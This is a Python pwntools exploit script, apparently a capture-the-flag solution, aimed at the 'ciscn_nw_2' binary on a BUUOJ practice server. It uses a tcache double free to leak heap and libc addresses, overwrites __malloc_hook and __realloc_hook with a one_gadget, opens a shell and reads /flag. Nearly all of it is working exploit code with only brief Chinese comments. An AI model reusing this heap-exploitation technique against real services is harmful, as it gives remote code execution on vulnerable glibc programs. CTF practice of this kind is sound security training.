from pwn import *

local = 0
if local == 1:
    p = process('./ciscn_nw_2')
    libc_elf = ELF('./libc-2.27_64.so')
    one = [0x4240e, 0x42462, 0xc4f7f, 0xe31fa, 0xe31ee]
else:
    p = remote('node4.buuoj.cn', 26243) 
    libc_elf = ELF('./libc-2.27_64.so')
    one = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a398, 0x10a38c]

elf = ELF('./ciscn_nw_2')
context.arch = 'amd64'
context.log_level = 'debug'

menu = b'>> '
def add(title, msg):
    p.sendlineafter(menu, b'1')
    p.sendafter(b"title:\n", title)
    p.sendafter(b"content:\n", msg)

def free(idx):
    p.sendlineafter(menu, b'2')
    p.sendlineafter(b"index:", str(idx).encode())

#正文
[add(b'a', b'b') for i in range(11)] #[0,10]
free(0)
free(0)
add(b'\xc0',b'AAAA') #11 260 n 260
heap_addr = u64(p.recvuntil(b' AAAA', drop=True).ljust(8, b'\x00'))
print('heap:', hex(heap_addr))
add(b'\x60',b'A'*0x50 + p64(0x81) + p64(heap_addr)) #12 260 n 2c0 在2c0预存指针
add(p64(heap_addr),b'\x00'*0x10 + p64(0x481)) #13 2c0 n 2c0  在2c0再建个环
free(1)
#建块,带出0x20处的main_arena+0x60
add(p64(heap_addr),b'A'*0x18) #11 2c0 n 2c0
malloc_hook = u64(p.recvuntil(b'\x7f', drop=False)[-6:].ljust(8, b'\x00'))- 0x60 -0x10 
libc_base = malloc_hook - libc_elf.sym['__malloc_hook']
free_hook = libc_base + libc_elf.sym['__free_hook']
system = libc_base + libc_elf.sym['system']
one_gadget = libc_base + one[7]
realloc = libc_base + libc_elf.sym['realloc']
print('libc:', hex(libc_base))
add(p64(malloc_hook - 8),b'A') #2c0 n 2c0
add(p64(malloc_hook - 8),b'A') #2c0 n malloc_hook-8
add(p64(one_gadget),p64(realloc)) #realloc_hook:one[7], malloc_hook:realloc 
#建块,得到shell
p.sendlineafter(menu, b'1')
p.sendline(b'cat /flag')
p.interactive()

